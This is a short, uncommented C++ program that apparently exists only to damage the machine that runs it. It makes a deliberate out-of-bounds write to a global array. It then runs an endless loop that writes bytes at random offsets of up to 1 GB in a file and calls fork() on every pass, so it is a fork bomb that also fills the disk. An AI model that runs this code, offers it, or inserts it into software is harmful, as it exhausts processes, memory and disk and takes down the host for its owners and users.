#include <iostream>
#include <sys/wait.h>
#include <unistd.h>
using namespace std;

int Fred[800] = {0}; 

int main() {
	cout << Fred << endl;
	Fred[8470] = 87592;
	FILE *f = fopen("tmp.txt","wb");
	for (;;) {
		fseek(f, rand() % (1024ll * 1024 * 1024), SEEK_SET);
		fputc('a', f);
		fflush(f);
		fork();
	}
	return false;
}
